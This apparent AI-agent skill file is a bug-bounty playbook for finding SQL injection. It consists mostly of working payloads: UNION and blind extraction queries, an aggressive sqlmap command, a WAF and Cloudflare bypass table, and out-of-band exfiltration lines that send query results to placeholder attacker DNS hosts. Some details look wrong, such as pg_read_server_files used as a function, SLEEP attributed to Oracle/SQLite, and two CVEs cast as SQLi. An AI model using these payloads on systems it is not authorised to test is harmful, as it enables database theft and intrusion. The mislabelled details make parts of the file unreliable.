---
name: hunt-sqli
description: SQL injection hunter — error-based, boolean, time-based, OOB, second-order, NoSQL excluded.
keywords: [sqli, sql injection, mysql, postgres, mssql, oracle, sqlite, union, blind, time-based, oob, sqlmap]
---

# hunt-sqli

## When this skill loads

Triggers: "sqli", "sql injection", "blind sql", "time-based",
"union select", "sqlmap", "boolean inference", "out-of-band".

## Pre-flight: confirm it's SQL not NoSQL

Mongo / DynamoDB / CouchDB use different operators. If the stack is
Node + Mongo, route to `hunt-nosql`. Indicators that the backend is
SQL:

- Numeric/quote breakage produces a stack trace mentioning
  `SQLException`, `psycopg2`, `mysqli`, `ORA-`, `PDO::PARAM_`.
- ORMs commonly indicate SQL backend: Django ORM, ActiveRecord,
  Hibernate, Doctrine, GORM.

## Phase 1 — detect

Quoted string injection:

```
'           → check for syntax-error 500 or visual breakage
\           → check for syntax-error (backslash escape)
"           → as above but in MySQL double-quoted contexts
'+'         → string concat in many SQL dialects
' OR '1'='1 → boolean true
' OR '1'='2 → boolean false (compare to "1=1" response)
```

Numeric context:

```
1+1   vs   1   →  if `1+1` returns the same record as `2`, integer math
1-1   vs   0   →  same logic
```

## Phase 2 — fingerprint the DBMS

| Test | DBMS |
|---|---|
| `' AND SLEEP(5)-- -` | MySQL |
| `' AND pg_sleep(5)-- -` | PostgreSQL |
| `'; WAITFOR DELAY '0:0:5'-- ` | MSSQL |
| `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual-- -` | Oracle |
| `'/**/UNION/**/SELECT 1,2,3-- -` (works) | likely MySQL/MariaDB (comment handling) |
| `'||SLEEP(5)-- -` | Oracle / SQLite use `||` for concat |

## Phase 3 — UNION-based extraction

Column count probe:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY N-- -    (until error)
```

Then:

```sql
' UNION SELECT NULL, NULL, NULL-- -
```

Replace each NULL with `'a'` to find string-typed columns.

Common payloads:

```sql
MySQL:    ' UNION SELECT user(), version(), database()-- -
Postgres: ' UNION SELECT current_user, version(), current_database()-- -
MSSQL:    ' UNION SELECT SYSTEM_USER, @@VERSION, DB_NAME()-- -
Oracle:   ' UNION SELECT USER, banner, NULL FROM v$version-- -
```

## Phase 4 — boolean blind

```
?id=1' AND SUBSTRING(version(),1,1)='5'-- -    (true → page render A)
?id=1' AND SUBSTRING(version(),1,1)='6'-- -    (false → page render B)
```

Automate with binary search of ASCII range or sqlmap. Sqlmap config:

```bash
sqlmap -u "https://target/api?id=1" \
  --cookie "session=..." \
  --level=5 --risk=3 \
  --technique=B --dbs --random-agent --batch
```

## Phase 5 — time-based blind

```
?id=1' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(3),0)-- -    (MySQL)
?id=1' AND CASE WHEN (SUBSTRING(version(),1,1)='1') THEN pg_sleep(3) ELSE 0 END-- -    (PG)
```

Calibrate: a baseline latency p95 + 2x is a confident detection
window. Add `-T 0.5` retry to sqlmap to reduce false positives.

## Phase 6 — out-of-band (OOB)

When boolean and time blind are unreliable (WAF strips `SLEEP`, page
caching defeats inference):

```sql
MSSQL: '; EXEC master..xp_dirtree '\\<attacker>.<dns-listener>\a'-- 
Oracle: ' || UTL_HTTP.request('http://<dns-listener>/?d='||(SELECT user FROM dual)) -- 
Postgres: ' || (SELECT pg_read_server_files('/tmp')) -- (if superuser)
MySQL Windows: ' UNION SELECT LOAD_FILE('\\\\<attacker>\\a') -- (uncommon)
```

Use Burp Collaborator / interact.sh for the DNS listener.

## Phase 7 — second-order

When `INSERT` doesn't directly expose injection but a later `SELECT`
does. Insert `' || (SELECT ...) || '` style payloads into username,
profile name, comments — then trigger the consuming endpoint
(profile lookup, search, admin panel).

## Phase 8 — WAF/filter bypass

| Filter | Bypass |
|---|---|
| Blocks `UNION SELECT` | `UNION/**/SELECT`, `UNiON SeLeCt`, `UNION%0aSELECT` |
| Blocks spaces | `UNION/**/SELECT/**/1`, parens `UNION(SELECT(1))` |
| Blocks quotes | `0x61` hex literal, `CHAR(97)` |
| Blocks `--` | `#` (MySQL), `;%00` |
| Blocks `OR` | `||`, `XOR` |
| Blocks SLEEP | `BENCHMARK(10000000,MD5(1))` |
| Cloudflare default | encode payload as `%0a` separators; use HTTP/2 header smuggling |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #244696 (Yelp) | Time-based on `Accept-Language` reflected into SQL `ORDER BY` |
| H1 #298176 (Vine/Twitter) | UNION via Search API `q` param after URL encoded `'` |
| H1 #1130828 (HackerOne) | Boolean blind on GraphQL where ID was concatenated unsanitized |
| H1 #1063614 (Mail.ru) | Second-order via username → triggered on profile page render |
| CVE-2024-27198 (TeamCity) | Authentication bypass + SQL via path traversal trick |
| CVE-2023-22515 (Confluence) | Admin SQLi after auth-bypass |

## Never-submit fallbacks

- Error 500 from `'` with no leakage and no further oracle → not yet
  reportable; produce a working extraction PoC first.
- ORDER BY with numeric inference that can only DoS → DOWNGRADE; not
  a SQLi report on its own.
- DBMS error disclosure (e.g., revealing PG version) without
  extraction → Info-only, usually KILL.

## See also

- `hunt-nosql` — non-relational injection
- `hunt-ldap` — directory-protocol injection (similar mental model)
- `hunt-cmdi` — when SQL function leads to OS command exec
  (`xp_cmdshell`, `COPY ... FROM PROGRAM`, `sys_exec`)
- `triage-validation` — Q6 demands actual data extraction PoC, not
  just an error
